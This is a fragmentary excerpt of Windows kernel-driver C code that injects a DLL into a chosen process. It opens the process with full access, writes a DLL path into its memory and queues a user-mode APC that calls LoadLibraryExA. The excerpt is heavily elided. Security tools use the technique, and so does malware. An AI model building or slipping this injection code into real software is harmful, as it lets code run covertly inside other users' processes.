...
void KeInitializeApc(
  ...
  PVOID NormalContext)
{
  return GetSystemAddress<KEINITIALIZEAPC>(L"KeInitializeApc")(
    Apc,
    Thread,
    Environment,
    KernelRoutine,
...
BOOLEAN KeInsertQueueApc(
  ...
  KPRIORITY Increment)
{
  return GetSystemAddress<KEINSERTQUEUEAPC>(L"KeInsertQueueApc")(
    Apc,
    SystemArgument1,
    SystemArgument2,
    Increment);
...
NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
  ...
  if (NT_SUCCESS(ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cidprocess)))
  {
    if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &pvMemory, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
      ...
      strcpy((PCHAR)pvMemory, DllFormatPath);
      KeUnstackDetachProcess(&KasState);
      Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
      if (Apc)
      {
        KeInitializeApc(Apc, Pethread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);
...
{
  DllInject((HANDLE)((PSIRIFEF_INJECTION_DATA)Context)->ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)->Process, ((PSIRIFEF_INJECTION_DATA)Context)->Ethread, FALSE);
...
VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* SystemArgument1, PVOID* SystemArgument2, PVOID* Context)
{
  ...
  Sf.ProcessId = (ULONG)PsGetCurrentProcessId();
